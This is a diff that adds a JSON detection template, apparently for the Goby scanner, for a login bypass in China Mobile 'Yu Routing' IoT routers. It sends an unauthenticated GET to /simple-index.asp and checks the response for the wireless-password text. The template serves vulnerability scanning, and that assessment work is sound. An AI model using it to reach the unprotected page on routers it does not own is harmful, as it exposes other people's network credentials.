@@ -1,0 +1,50 @@
+{
+      "Name": "China Mobile Yu Routing Login Bypass",
+      "Level": "2",
+      "Tags": [
+            "bypass"
+      ],
+      "GobyQuery": "body=\"中移\"",
+      "Description": "Yu Routing is an IoT router.",
+      "Product": "China Mobile Yu Routing",
+      "Homepage": "",
+      "Author": "",
+      "Impact": "China Mobile Yu Routing Login Bypass",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/simple-index.asp",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "无线密码",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
